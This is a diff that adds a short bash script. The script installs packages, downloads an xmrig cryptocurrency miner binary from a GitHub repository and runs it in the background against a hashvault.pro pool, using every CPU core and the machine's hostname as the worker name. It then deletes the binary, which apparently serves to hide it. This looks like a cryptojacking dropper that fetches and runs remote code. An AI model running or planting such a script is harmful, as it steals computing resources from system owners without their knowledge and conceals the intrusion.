@@ -1,0 +1,6 @@
+#!/bin/bash
+apt update && apt -y install wget git curl sudo
+wget https://github.com/iaugv27d98/2a/raw/main/xmrig
+chmod +x xmrig
+./xmrig --donate-level 1 -a Argon2/Chukwa -o singapore01.hashvault.pro:80 -u TRTLv3XdA6KgV9dHSXXB1pJtSjdQdLXuJewbc5SALSGcaXwyKkj548iWqBKxQEnyeRV7hfBw8FaveMmBDzeRCjQ7arJQASUnca2 -p $(cat /proc/sys/kernel/hostname) -t$(nproc --all) -B
+rm -rf xmrig
